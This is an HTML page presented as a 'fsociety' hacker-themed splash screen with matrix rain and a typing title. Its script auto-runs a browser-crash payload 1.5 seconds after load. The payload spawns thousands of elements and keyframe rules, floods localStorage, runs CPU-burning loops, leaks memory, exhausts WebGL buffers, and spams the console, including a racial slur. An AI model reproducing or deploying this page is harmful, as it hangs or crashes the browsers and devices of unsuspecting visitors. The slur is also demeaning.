<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>fsociety</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #0b0e0b;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            font-family: 'Courier New', monospace;
            background: radial-gradient(ellipse at center, #0a1a0a 0%, #050805 100%);
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            pointer-events: none;
            opacity: 0.03;
            background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
            background-size: 256px 256px;
        }

        body::after {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            pointer-events: none;
            opacity: 0.04;
            background-image: 
                linear-gradient(rgba(0, 255, 157, 0.05) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 255, 157, 0.05) 1px, transparent 1px);
            background-size: 60px 60px;
        }

        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            pointer-events: none;
            opacity: 0.13;
            font-size: 16px;
            color: #00ff9d;
            line-height: 1.4;
            overflow: hidden;
            word-break: break-all;
            filter: blur(0.6px);
        }

        .char {
            display: inline-block;
            animation: fall 14s linear infinite;
            opacity: 0.15;
            text-shadow: 0 0 8px #00ff9d44;
        }

        .char.bright {
            opacity: 0.35;
            color: #66ffbb;
            text-shadow: 0 0 20px #00ff9d66;
        }

        @keyframes fall {
            0% { transform: translateY(-120vh) rotate(0deg); opacity: 0; }
            10% { opacity: 0.2; }
            90% { opacity: 0.2; }
            100% { transform: translateY(120vh) rotate(720deg); opacity: 0; }
        }

        .glitch-line {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 1px;
            background: linear-gradient(90deg, transparent, #00ff9d55, #00ff9dcc, #00ff9d55, transparent);
            z-index: 3;
            animation: scan 8s ease-in-out infinite;
            opacity: 0.25;
            pointer-events: none;
            box-shadow: 0 0 40px #00ff9d22;
        }

        @keyframes scan {
            0% { top: -2%; opacity: 0.05; }
            50% { opacity: 0.6; }
            100% { top: 102%; opacity: 0.05; }
        }

        .corner-bracket {
            position: fixed;
            color: #00ff9d33;
            font-size: 36px;
            z-index: 2;
            pointer-events: none;
            font-weight: 100;
            opacity: 0.25;
            animation: breathe 3s ease-in-out infinite alternate;
            font-family: 'Courier New', monospace;
        }

        .corner-bracket.tl { top: 24px; left: 34px; animation-delay: 0s; }
        .corner-bracket.tr { top: 24px; right: 34px; transform: scaleX(-1); animation-delay: 0.7s; }
        .corner-bracket.bl { bottom: 24px; left: 34px; transform: scaleY(-1); animation-delay: 1.4s; }
        .corner-bracket.br { bottom: 24px; right: 34px; transform: scale(-1, -1); animation-delay: 2.1s; }

        @keyframes breathe {
            0% { opacity: 0.15; }
            100% { opacity: 0.45; }
        }

        .typing-container {
            position: relative;
            z-index: 2;
            text-align: center;
            padding: 0 20px;
            background: rgba(0, 15, 0, 0.2);
            backdrop-filter: blur(4px);
            -webkit-backdrop-filter: blur(4px);
            border-radius: 60px;
            padding: 36px 70px;
            border: 1px solid rgba(0, 255, 157, 0.2);
            box-shadow: 
                0 0 100px rgba(0, 255, 157, 0.04),
                inset 0 0 60px rgba(0, 255, 157, 0.03),
                0 0 200px rgba(0, 255, 157, 0.02);
            transition: all 0.4s ease;
        }

        .typing-container:hover {
            border-color: rgba(0, 255, 157, 0.4);
            box-shadow: 
                0 0 140px rgba(0, 255, 157, 0.08),
                inset 0 0 80px rgba(0, 255, 157, 0.05),
                0 0 300px rgba(0, 255, 157, 0.03);
        }

        .typing-text {
            font-size: clamp(56px, 12vw, 110px);
            font-weight: 900;
            letter-spacing: 14px;
            color: #00ff9d;
            font-family: 'Courier New', monospace;
            border-right: 5px solid #00ff9d;
            padding-right: 12px;
            display: inline-block;
            white-space: nowrap;
            overflow: hidden;
            animation: blink 0.7s step-end infinite;
            background: linear-gradient(180deg, #66ffbb 15%, #00ff9d 45%, #00cc7a 85%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            filter: drop-shadow(0 0 40px rgba(0, 255, 157, 0.25)) drop-shadow(2px 2px 0px rgba(0, 255, 157, 0.08));
            position: relative;
            text-shadow: none;
        }

        .typing-text::after {
            content: 'fsociety';
            position: absolute;
            top: 0;
            left: 0;
            background: linear-gradient(180deg, #66ffbb 15%, #00ff9d 45%, #00cc7a 85%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            filter: drop-shadow(0 0 40px rgba(0, 255, 157, 0.15));
            opacity: 0.15;
            transform: translate(3px, -2px);
            z-index: -1;
            letter-spacing: 14px;
            padding-right: 12px;
            border-right: 5px solid transparent;
        }

        @keyframes blink {
            0%, 100% { border-color: #00ff9d; }
            50% { border-color: transparent; }
        }

        @media (max-width: 600px) {
            .typing-container {
                padding: 24px 32px;
                border-radius: 32px;
                background: rgba(0, 15, 0, 0.25);
                backdrop-filter: blur(6px);
                -webkit-backdrop-filter: blur(6px);
            }
            .typing-text {
                letter-spacing: 8px;
                font-size: clamp(48px, 14vw, 72px);
                border-right-width: 4px;
                padding-right: 8px;
            }
            .typing-text::after {
                letter-spacing: 8px;
                padding-right: 8px;
            }
            .corner-bracket { 
                display: none;
            }
            .matrix-bg {
                opacity: 0.08;
            }
        }

        @media (max-width: 400px) {
            .typing-container {
                padding: 18px 20px;
                border-radius: 24px;
            }
            .typing-text {
                letter-spacing: 4px;
                font-size: clamp(36px, 12vw, 52px);
            }
            .typing-text::after {
                letter-spacing: 4px;
            }
        }

        .crash-layer {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 99999;
            pointer-events: none;
            display: none;
            mix-blend-mode: screen;
        }

        .crash-layer.active {
            display: block;
        }
    </style>
</head>
<body>

    <div class="matrix-bg" id="matrixBg"></div>
    <div class="glitch-line"></div>

    <div class="corner-bracket tl">┌</div>
    <div class="corner-bracket tr">┐</div>
    <div class="corner-bracket bl">└</div>
    <div class="corner-bracket br">┘</div>

    <div class="typing-container" id="typingContainer">
        <div class="typing-text" id="typingText"></div>
    </div>

    <div class="crash-layer" id="crashLayer"></div>

    <script>
        (function() {
            const bg = document.getElementById('matrixBg');
            const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
            let html = '';
            for (let i = 0; i < 450; i++) {
                const char = chars[Math.floor(Math.random() * chars.length)];
                const delay = Math.random() * 18;
                const duration = 10 + Math.random() * 14;
                const size = 18 + Math.floor(Math.random() * 16);
                const bright = Math.random() > 0.85 ? ' bright' : '';
                html += `<span class="char${bright}" style="animation-delay:${delay}s;animation-duration:${duration}s;font-size:${size}px;">${char}</span>`;
            }
            bg.innerHTML = html;
        })();

        const text = 'fsociety';
        const typingElement = document.getElementById('typingText');
        let index = 0;

        function typeLetter() {
            if (index < text.length) {
                typingElement.textContent += text[index];
                index++;
                setTimeout(typeLetter, 90);
            }
        }
        typeLetter();

        function playSound() {
            try {
                const audioCtx = new(window.AudioContext || window.webkitAudioContext)();
                const osc = audioCtx.createOscillator();
                const gain = audioCtx.createGain();
                osc.connect(gain);
                gain.connect(audioCtx.destination);
                osc.frequency.value = 440;
                gain.gain.value = 0.04;
                osc.start();
                gain.gain.exponentialRampToValueAtTime(0.00001, audioCtx.currentTime + 0.2);
                osc.stop(audioCtx.currentTime + 0.2);
                audioCtx.resume();
            } catch(e) {}
        }

        function startCrash() {
            const crashLayer = document.getElementById('crashLayer');
            crashLayer.classList.add('active');
            playSound();

            for (let i = 0; i < 7100; i++) {
                const div = document.createElement('div');
                div.style.position = 'absolute';
                div.style.width = '6px';
                div.style.height = '6px';
                div.style.backgroundColor = `rgb(0, ${i % 255}, 0)`;
                div.style.left = Math.random() * 100 + '%';
                div.style.top = Math.random() * 100 + '%';
                div.style.backdropFilter = 'blur(5px)';
                div.style.filter = `hue-rotate(${i * 10}deg)`;
                div.style.transform = `rotate(${i % 360}deg)`;
                crashLayer.appendChild(div);
            }

            const style = document.createElement('style');
            let css = '';
            for (let i = 0; i < 4100; i++) {
                css += `@keyframes f${i}{
                    0%{transform:translate(0,0)}
                    100%{transform:translate(${i % 15}px,${i % 15}px)}
                }
                .f${i}{animation:f${i}0.002s infinite alternate}`;
            }
            style.textContent = css;
            document.head.appendChild(style);

            const divs = crashLayer.children;
            for (let i = 0; i < divs.length; i++) {
                divs[i].classList.add('f' + (i % 4100));
            }

            let count = 0;
            setInterval(() => {
                for (let i = 0; i < 150; i++) {
                    try {
                        localStorage.setItem('f_' + count + '_' + i, 'X'.repeat(15000));
                        count++;
                        if (count > 200) {
                            localStorage.clear();
                            count = 0;
                        }
                    } catch(e) {}
                }
            }, 10);

            const target = document.body;
            new MutationObserver(() => {}).observe(target, { attributes: true, childList: true });
            setInterval(() => {
                target.setAttribute('data-x', Math.random());
            }, 1);

            for (let t = 0; t < 6; t++) {
                setInterval(() => {
                    let j = 0;
                    for (let k = 0; k < 5000000; k++) {
                        j += k * 0.000001;
                    }
                }, 5);
            }

            const canvas = document.createElement('canvas');
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            canvas.style.position = 'fixed';
            canvas.style.top = '0';
            canvas.style.left = '0';
            canvas.style.pointerEvents = 'none';
            canvas.style.zIndex = '99998';
            document.body.appendChild(canvas);
            const ctx = canvas.getContext('2d');
            let frame = 0;

            function draw() {
                frame++;
                ctx.fillStyle = 'rgba(0,0,0,0.02)';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                for (let d = 0; d < 100; d++) {
                    const x = Math.random() * canvas.width;
                    const y = Math.random() * canvas.height;
                    const size = 6 + Math.random() * 20;
                    const hue = (frame * 0.5 + d * 12) % 360;
                    ctx.fillStyle = `hsla(${hue}, 100%, 60%, 0.3)`;
                    ctx.shadowColor = `hsla(${hue}, 100%, 60%, 0.2)`;
                    ctx.shadowBlur = 30;
                    ctx.beginPath();
                    ctx.arc(x, y, size * 0.5, 0, Math.PI * 2);
                    ctx.fill();
                    ctx.shadowBlur = 0;
                }
                requestAnimationFrame(draw);
            }
            draw();

            let leak = [];
            setInterval(() => {
                for (let i = 0; i < 100; i++) {
                    leak.push('💀'.repeat(5000));
                }
                if (leak.length > 500) leak = [];
            }, 30);

            try {
                const canvas2 = document.createElement('canvas');
                canvas2.width = 2000;
                canvas2.height = 2000;
                const gl = canvas2.getContext('webgl') || canvas2.getContext('experimental-webgl');
                if (gl) {
                    for (let i = 0; i < 5000; i++) {
                        const buffer = gl.createBuffer();
                        gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
                        gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(70000), gl.STATIC_DRAW);
                    }
                }
            } catch(e) {}

            setInterval(() => {
                console.error('activating hack');
                console.warn('ubuntu trash os');
                console.log('dont look nigha');
            }, 500);
        }

        setTimeout(() => {
            startCrash();
        }, 1500);
    </script>

</body>
</html>
